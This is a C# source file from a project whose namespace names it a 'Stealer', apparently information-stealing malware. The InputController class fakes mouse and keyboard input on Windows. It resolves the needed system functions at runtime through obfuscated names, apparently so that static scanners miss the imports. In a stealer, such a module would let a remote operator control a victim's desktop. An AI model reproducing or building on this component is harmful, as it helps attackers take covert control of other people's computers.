using System;
using System.Runtime.InteropServices;

namespace Stealer.Utils
{
    public static class InputController
    {
        private const uint MOUSEEVENTF_MOVE = 0x0001;
        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP = 0x0004;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        private const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
        private const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
        private const uint MOUSEEVENTF_ABSOLUTE = 0x8000;

        private const uint KEYEVENTF_KEYUP = 0x0002;

        private delegate void MouseEventDelegate(uint dwFlags, uint dx, uint dy, uint dwData, IntPtr dwExtraInfo);
        private delegate void KeyEventDelegate(byte bVk, byte bScan, uint dwFlags, uint dwExtraInfo);
        private delegate bool SetCursorPosDelegate(int x, int y);

        private static MouseEventDelegate _me;
        private static KeyEventDelegate _ke;
        private static SetCursorPosDelegate _scp;
        private static int _screenW = -1, _screenH = -1;

        private static MouseEventDelegate ME()
        {
            return _me ?? (_me = NativeLoader.Resolve<MouseEventDelegate>(NativeLoader.Lib_U32, NativeLoader.Fn_ME));
        }
        private static KeyEventDelegate KE()
        {
            return _ke ?? (_ke = NativeLoader.Resolve<KeyEventDelegate>(NativeLoader.Lib_U32, NativeLoader.Fn_KE));
        }
        private static SetCursorPosDelegate SCP()
        {
            return _scp ?? (_scp = NativeLoader.Resolve<SetCursorPosDelegate>(NativeLoader.Lib_U32, NativeLoader.Fn_SCP));
        }

        private static void EnsureScreenSize()
        {
            if (_screenW > 0) return;
            var getMetrics = NativeLoader.Resolve<GetSystemMetricsDelegate>(NativeLoader.Lib_U32, NativeLoader.Fn_GSM);
            if (getMetrics != null)
            {
                _screenW = getMetrics(0);
                _screenH = getMetrics(1);
            }
            if (_screenW <= 0) _screenW = 1920;
            if (_screenH <= 0) _screenH = 1080;
        }

        public static void MoveTo(double nx, double ny)
        {
            EnsureScreenSize();
            int x = (int)(nx * _screenW);
            int y = (int)(ny * _screenH);
            var scp = SCP();
            if (scp != null) scp(x, y);
            var me = ME();
            if (me != null)
            {
                uint ax = (uint)(x * 65535 / _screenW);
                uint ay = (uint)(y * 65535 / _screenH);
                me(MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE, ax, ay, 0, IntPtr.Zero);
            }
        }

        public static void MouseDown(string button)
        {
            var me = ME();
            if (me == null) return;
            uint flag;
            switch (button)
            {
                case "right":  flag = MOUSEEVENTF_RIGHTDOWN; break;
                case "middle": flag = MOUSEEVENTF_MIDDLEDOWN; break;
                default:       flag = MOUSEEVENTF_LEFTDOWN; break;
            }
            me(flag, 0, 0, 0, IntPtr.Zero);
        }

        public static void MouseUp(string button)
        {
            var me = ME();
            if (me == null) return;
            uint flag;
            switch (button)
            {
                case "right":  flag = MOUSEEVENTF_RIGHTUP; break;
                case "middle": flag = MOUSEEVENTF_MIDDLEUP; break;
                default:       flag = MOUSEEVENTF_LEFTUP; break;
            }
            me(flag, 0, 0, 0, IntPtr.Zero);
        }

        public static void Click(string button, bool doubleClick)
        {
            MouseDown(button);
            MouseUp(button);
            if (doubleClick)
            {
                MouseDown(button);
                MouseUp(button);
            }
        }

        public static void ScrollDelta(int delta)
        {
            var me = ME();
            if (me != null) me(0x0800 /*WHEEL*/, 0, 0, (uint)(delta * 120), IntPtr.Zero);
        }

        public static void Scroll(int delta)
        {
            ScrollDelta(delta);
        }

        public static void KeyDown(byte vk)
        {
            var ke = KE();
            if (ke != null) ke(vk, 0, 0, 0);
        }

        public static void KeyUp(byte vk)
        {
            var ke = KE();
            if (ke != null) ke(vk, 0, KEYEVENTF_KEYUP, 0);
        }

        public static void KeyPress(byte vk)
        {
            KeyDown(vk);
            KeyUp(vk);
        }

        private delegate int GetSystemMetricsDelegate(int nIndex);
    }
}
